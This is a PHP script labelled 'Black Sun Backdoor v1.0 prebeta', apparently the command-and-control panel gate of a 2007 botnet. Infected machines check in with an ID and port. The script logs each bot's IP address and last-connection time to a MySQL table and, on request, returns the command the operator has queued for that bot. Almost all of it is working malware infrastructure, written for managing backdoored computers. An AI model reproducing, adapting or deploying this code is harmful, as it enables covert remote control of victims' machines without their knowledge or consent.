<?php
/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *  ---------------------------------------------------------------------
 */
	Error_Reporting(E_ALL & ~E_NOTICE);
	

	include("conf.php");

	function ConnectMySQL($host, $login, $password, $database)
	{
			$connect=mysql_connect($host,$login,$password);
			
			if ($connect===FALSE)
			{
				die('cant connect to database');
			}
			
			$selectdb=mysql_select_db($database);
			
			if ($selectdb==FALSE)
			{
				die('cant select database'); 
			}
	}

	ConnectMySQL($db_host, $db_login, $db_password, $db_database);
	
	 $uid			=		htmlspecialchars(addslashes($_GET['uid'])); 
	 $data 			= 		htmlspecialchars(addslashes(getenv("REMOTE_ADDR")));
	 $gcmd			=		$_GET['getcmd']; 
	 $port			=		htmlspecialchars(addslashes($_GET['port']));
	 $lconnection 		=		date ("H:i:s d.m.Y");

 if ($gcmd == 1)
 {
	$res=mysql_query("SELECT cmd FROM $db_botable WHERE uid='".$uid."'");
	for ($i=0, $ROWS=mysql_num_rows($res); $i<$ROWS; $i++)
	{
		$row=mysql_fetch_row($res);
		for($j=0;$j<count($row);$j++) 
		echo $row[$j]; 
	}
	
	if($row)
	{
			#echo mysql_result($select, 0);
			$update = mysql_query("UPDATE $db_botable SET data='$data', lconnection='$lconnection', port='$port' WHERE uid='$uid'");
			#echo mysql_result($update, 0);
	}
	else
	{
 		mysql_query("
				INSERT INTO $db_botable (uid, data, cmd, port, lconnection) VALUES ('$uid', '$data', '', '$port', '$lconnection')
			    ");
	}
 }
 ?>